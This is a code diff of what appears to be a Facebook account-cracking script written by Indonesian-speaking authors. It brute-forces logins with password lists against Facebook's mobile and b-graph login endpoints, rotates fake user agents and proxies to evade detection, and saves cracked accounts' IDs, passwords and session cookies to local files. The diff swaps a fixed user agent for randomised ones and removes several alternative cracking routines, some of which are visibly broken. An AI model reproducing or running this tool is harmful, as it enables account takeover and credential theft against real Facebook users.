@@ -167,7 +167,7 @@ for xd in range(1000):
 	strvnokiax = f"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/{str(rc(build_nokiax))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 NokiaBrowser/7.{str(rr(1,5))}.1.{str(rr(16,37))} {str(rc(aZ))}{str(rr(1,1000))}"
 	strvgt = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {str(rc(gt))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 {str(rc(aZ))}{str(rr(1,1000))}"
 	uateddy = random.choice([strvredmi,strvsamsung,strvgt])
-	baru.append(uateddy)
+	ugen.append(uateddy)
 
 for xd in range(10000):
 	rr = random.randint; rc = random.choice
@@ -1422,7 +1422,7 @@ def metcepat():
 
 def mbasic(idf, pwv):
 	global ok, cp, loop
-	bo = random.choice([m, k, h, b, u, x])
+	#bo = random.choice([m, k, h, b, u, x])
 	prog.update(des,description=f" {K2}•{H2} ASYNC {P2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id2)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
 	prog.advance(des)
 	ua = random.choice(baru)
@@ -1434,248 +1434,32 @@ def mbasic(idf, pwv):
 		link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=266003681172790&kid_directed_site=0&app_id=266003681172790&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fclient_id%3D266003681172790%26redirect_uri%3Dhttps%253A%252F%252Fapp.heylink.me%252Flogin%252Ffacebook%26state%3Dfbloginheylinkme%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5327ef2a-17a4-41a6-ba33-aa8acdda0343%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fapp.heylink.me%2Flogin%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dfbloginheylinkme%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&rtime=1702051010&hrc=1&wtsid=rdr_03CkC8hTBPuvnU7RM&_rdr')
 		data = {'bi_xrwh': 0}
 		headers = {
-			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+			'user-agent': ua,
 			'viewport-width': '980'
 		}
-		po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=266003681172790&auth_token=163217a672b552df614d575382df8cc6&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fclient_id%3D266003681172790%26redirect_uri%3Dhttps%253A%252F%252Fapp.heylink.me%252Flogin%252Ffacebook%26state%3Dfbloginheylinkme%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5327ef2a-17a4-41a6-ba33-aa8acdda0343%26tp%3Dunspecified&refsrc=deprecated&app_id=266003681172790&cancel=https%3A%2F%2Fapp.heylink.me%2Flogin%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dfbloginheylinkme%23_%3D_&lwv=100',
-			      data=data, headers=headers, allow_redirects=False, proxies=proxs)
+		po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=266003681172790&auth_token=163217a672b552df614d575382df8cc6&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fclient_id%3D266003681172790%26redirect_uri%3Dhttps%253A%252F%252Fapp.heylink.me%252Flogin%252Ffacebook%26state%3Dfbloginheylinkme%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5327ef2a-17a4-41a6-ba33-aa8acdda0343%26tp%3Dunspecified&refsrc=deprecated&app_id=266003681172790&cancel=https%3A%2F%2Fapp.heylink.me%2Flogin%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dfbloginheylinkme%23_%3D_&lwv=100',data=data, headers=headers, allow_redirects=False, proxies=proxs)
 		
 		if 'c_user' in ses.cookies.get_dict().keys():
 			ok += 1
 			coki = po.cookies.get_dict()
 			kuki = ';'.join([f'''{key!s}={value!s}''' for key, value in ses.cookies.get_dict().items()])
-			print(f'''{H2}[FANKY-OK] {tahun(idf)} >> \x1b[38;5;46m{idf} >> {pw}''')
-			open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '\n')
-			open('/sdcard/FANKY-OK.txt', 'a').write(idf + ' | ' + pw + ' | ' + kuki + '\n')
+			tree = Tree(f" ")
+			tree.add(f"[bold yellow]{idf}|{pw}")
+			tree.add(f"[bold yellow]{ua}")
+			cetak(tree)
+			open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 		if 'checkpoint' in po.cookies.get_dict().keys():
-			print(f'''{M2} [FANKY-CP] {tahun(idf)} >> \x1b[38;5;46m{idf} >> {pw}''')
-			open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
-			open('/sdcard/FANKY-CP.txt', 'a').write(idf + ' | ' + pw + '\n')
-			akun.append(idf + '|' + pw)
 			cp += 1
+			tree = Tree(f" ")
+			tree.add(f"[bold yellow]{idf}|{pw}")
+			tree.add(f"[bold yellow]{ua}")
+			cetak(tree)
+			open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+			akun.append(idf + '|' + pw)
 		if requests.exceptions.ConnectionError:
 			'upgrade-insecure-requests'
 			time.sleep(31)
 		loop += 1
-
-
-def mbasicgc(idf, name, pwv):
-	global loop
-	mcc = random.choice([
-            'SM-F711B',
-            'SM-F711N',
-            'SM-F711U',
-            'SM-F711U1',
-            'SM-E025F',
-            'SM-T575',
-            'SM-A516V',
-            'SM-M017F',
-            'SM-J260GU',
-            'SM-J260GU',
-            'SM-J260FU',
-            'SM-J260MU',
-            'SM-A716F',
-            'SM-A716F',
-            'SM-A716F',
-            'SM-A7160',
-            'SM-A716B',
-            'SM-A716U',
-            'SM-A716B',
-            'SM-M115F',
-            'SM-M115F',
-            'SM-M115M',
-            'SM-M115M',
-            'SM-G988',
-            'SM-G988U',
-            'SM-G988U1',
-            'SM-G9880',
-            'SM-G988B',
-            'SM-G988N',
-            'SM-G988B',
-            'SM-T927A',
-            'SM-T920',
-            'SM-A305F',
-            'SM-A305FN',
-            'SM-A305G',
-            'SM-A305GN',
-            'SM-A305YN',
-            'SM-A3050',
-            'SM-A305N',
-            'SM-A305GT',
-            'SM-A105F',
-            'SM-A105G',
-            'SM-A105M',
-            'SM-A105FN',
-            'SM-A920F',
-            'SM-A9200',
-            'SM-A920N',
-            'SM-A920X',
-            'SM-N960F',
-            'SM-N9600',
-            'SM-N960F',
-            'SM-N960U',
-            'SM-N960U1',
-            'SM-N960N',
-            'SM-N960W',
-            'SM-N960X',
-            'SCV40'])
-	uai = '[FBAN/FB4A;FBAV/' + str(random.randint(111, 999)) + '.0.0.' + str(random.randint(1111, 9999)) + ';FBBV/' + str(random.randint(1111111, 9999999)) + ';[FBAN/FB4A;FBAV/' + str(random.randint(40, 200)) + '.0.0.' + str(random.randint(1, 66)) + '.117;FBBV/308613358;FBDM/{density=2.0,width=720,height=1440};FBLC/it_IT;FBRV/' + str(random.randint(111111111, 666666666)) + ';FBCR/Airalo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/' + str(mcc) + ';FBSV/7.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
-	cn = random.randint(60, 99)
-	sys.stdout.write(f'''\r\x1b[1;31m[\x1b[1;32mKAGUYA-M2\x1b[1;31m] \x1b[1;36m{loop}\x1b[1;35m \x1b[1;34m|\x1b[1;32m OK\x1b[1;34m|\x1b[1;31mCP \x1b[1;32m{len(oks)}\x1b[1;34m|\x1b[1;31m{len(cps)} \x1b[1;34m| \x1b[1;36m{'{:.0%}'.format(loop / float(len(self.id)))}{S}''')
-	sys.stdout.flush()
-	fs = name.split(' ')[0]
-	ls = name.split(' ')[1]
-	ls = fs
-	for ps in pwv:
-		ps = pw.replace('first', fs.lower()).replace('First', fs).replace('last', ls.lower()).replace('Last', ls).replace('Name', name).replace('name', name.lower())
-		session = requests.Session()
-		data = {
-			'method': 'auth.login',
-			'fb_api_req_friendly_name': 'authenticate',
-			'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
-			'api_key': '882a8490361da98702bf97a021ddc14d' }
-		None(None, None)
-		if not 'GB':
-			pass
-		'client_country_code'
-		'en_GB'
-		'locale'
-		headers = {
-			'Content-Length': f'''6{cn}''' }
-		q = session.post('https://b-graph.facebook.com/auth/login', data = data, headers = headers, allow_redirects = False).json()
-		if 'session_key' in q:
-			ckkk = ";".join(i["name"]+"="+i["value"] for i in q()["session_cookies"])
-			KAGUYAb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
-			cookie = f'''sb={KAGUYAb};{ckkk}'''
-			print(f'''\r\r\x1b[1;31m[\x1b[1;32mKAGUYA-OK\x1b[1;31m]\x1b[1;32m {idf} | {ps} ''')
-			print(f'''\r\r\x1b[1;31m[\x1b[1;32mCOOKIES\x1b[1;31m]{O}{cookie} ''')
-			open('/sdcard/KAGUYA-M2-FILE-OK.txt', 'a').write(idf + '|' + ps + '|' + cookie + '\n')
-			oks.append(idf)
-			';'.join
-		if 'www.facebook.com' in q['error']['message']:
-			print(f'''\r\r{M}[KAGUYA-CP] {idf} | {ps} ''')
-			open('/sdcard/KAGUYA-M2-FILE-OK.txt', 'a').write(idf + '|' + ps + '\n')
-			cps.append(idf)
-		loop += 1
-		return None
-		if requests.exceptions.ConnectionError:
-			'Keep-Alive'
-			mbasic(idf, mame, pwv)
-			return None
-
-
-def mbasiccjd(idf,pwv):
-	global loop,ok,cp
-	bo = random.choice([m,k,h,b,u,x])
-	ua = random.choice(baru)
-	cn = random.randint(60, 99)
-	ses = requests.Session()
-	prog.update(des,description=f"{h} [b-graph new] {P2}{idf} [bold blue]{loop}/{len(id)} OK-:[bold cyan]{ok}[/] CP-:[bold gold]{cp}[/]")
-	prog.advance(des)
-	for pw in pwv:
-		try:
-			if 'ya' in ualuh: ua = ualu[0]
-			data = {'method': 'auth.login','fb_api_req_friendly_name': 'authenticate','fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler','api_key': '882a8490361da98702bf97a021ddc14d'}
-			headers = {'Content-Length': f'''6{cn}'''}
-			po = ses.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
-			if "session_key" in po:
-				tree = Tree(f" ")
-				tree.add(f"[red]{idf}").add(f"[red]{pw}")
-				tree.add(f"[red]{ua}\n")
-				cetak(tree)
-				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
-				akun.append(idf+'|'+pw)
-				cp+=1
-				break
-			elif 'www.facebook.com' in po.get('error', {}).get('message', ''):
-				ok+=1
-				#cokii = ";".join(i["name"] + "=" + i["value"] for i in q["session_cookies"])
-				#Fanky = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
-				#cookie = f'''sb={Fanky};{cokii}'''
-				tree = Tree(f"  ")
-				tree.add(f"[green]{idf}").add(f"[green]{pw}").add(f"[green]{ua}\n")
-				#tree.add(f"[green]{kuki}\n")
-				cetak(tree) 
-				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
-				cek_apk(session,coki)
-				break
-				
-			else:
-				continue
-		except requests.exceptions.ConnectionError:
-			time.sleep(31)
-	loop+=1
-	return None
-	if requests.exceptions.ConnectionError:
-		'Keep-Alive'
-		mbasicKU(idf,pw)
-		return None
-
-
-
-
-def mbasicvhbo(idf, pwv):
-    global loop, ok, cp
-    mcc = random.choice([
-        'SM-F711B', 'SM-F711N', 'SM-F711U', 'SM-F711U1', 'SM-E025F', 'SM-T575', 'SM-A516V', 'SM-M017F', 'SM-J260GU',
-        'SM-J260GU', 'SM-J260FU', 'SM-J260MU', 'SM-A716F', 'SM-A716F', 'SM-A716F', 'SM-A7160', 'SM-A716B', 'SM-A716U',
-        'SM-A716B', 'SM-M115F', 'SM-M115F', 'SM-M115M', 'SM-M115M', 'SM-G988', 'SM-G988U', 'SM-G988U1', 'SM-G9880',
-        'SM-G988B', 'SM-G988N', 'SM-G988B', 'SM-T927A', 'SM-T920', 'SM-A305F', 'SM-A305FN', 'SM-A305G', 'SM-A305GN',
-        'SM-A305YN', 'SM-A3050', 'SM-A305N', 'SM-A305GT', 'SM-A105F', 'SM-A105G', 'SM-A105M', 'SM-A105FN', 'SM-A920F',
-        'SM-A9200', 'SM-A920N', 'SM-A920X', 'SM-N960F', 'SM-N9600', 'SM-N960F', 'SM-N960U', 'SM-N960U1', 'SM-N960N',
-        'SM-N960W', 'SM-N960X', 'SCV40'])
-
-    ua = '[FBAN/FB4A;FBAV/' + str(random.randint(111, 999)) + '.0.0.' + str(random.randint(1111, 9999)) + ';FBBV/' + str(random.randint(1111111, 9999999)) + ';[FBAN/FB4A;FBAV/' + str(random.randint(40, 200)) + '.0.0.' + str(random.randint(1, 66)) + '.117;FBBV/308613358;FBDM/{density=2.0,width=720,height=1440};FBLC/it_IT;FBRV/' + str(random.randint(111111111, 666666666)) + ';FBCR/Airalo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/' + str(mcc) + ';FBSV/7.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
-
-    cn = random.randint(60, 99)
-
-    # Perbarui progress (pastikan 'prog' dan 'des' sudah didefinisikan sebelumnya)
-    prog.update(des, description=f"[[bold green]B-API[bold white]] [[bold green]{idf}[bold white]] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
-    prog.advance(des)
-
-    for ps in pwv:  # Pastikan 'pw' adalah list atau iterable
-        session = requests.Session()
-        data = {
-            'method': 'auth.login',
-            'fb_api_req_friendly_name': 'authenticate',
-            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
-            'api_key': '882a8490361da98702bf97a021ddc14d'
-        }
-
-        headers = {
-            'Content-Length': f'''6{cn}'''
-        }
-
-        q = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
-
-        if 'session_key' in q:
-            cokii = ";".join(i["name"] + "=" + i["value"] for i in q["session_cookies"])
-            Fanky = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
-            cookie = f'''sb={Fanky};{cokii}'''
-            tree = Tree(f"  ")
-            tree.add(f"[green]{idf}").add(f"[green]{ps}").add(f"[green]{ua}\n")
-            tree.add(f"[green]{cookie}\n")
-            cetak(tree)
-            open('OK/' + okc, 'a').write(idf + '|' + ps + '\n')
-
-        if 'www.facebook.com' in q.get('error', {}).get('message', ''):
-            tree = Tree(f" ")
-            tree.add(f"[red]{idf}").add(f"[red]{ps}")
-            tree.add(f"[red]{ua}\n")
-            cetak(tree)
-            open('CP/' + cpc, 'a').write(idf + '|' + ps + '\n')
-            akun.append(idf + '|' + ps)
-
-        loop += 1
-        return None
-
-        # Menangani error koneksi
-        try:
-            pass  # Tangani koneksi di sini
-        except requests.exceptions.ConnectionError:
-            # Menghindari rekursi tanpa henti
-            mbasic(idf, pw)
-            return None
 
 
 def mbasiccc(idf, pwv):
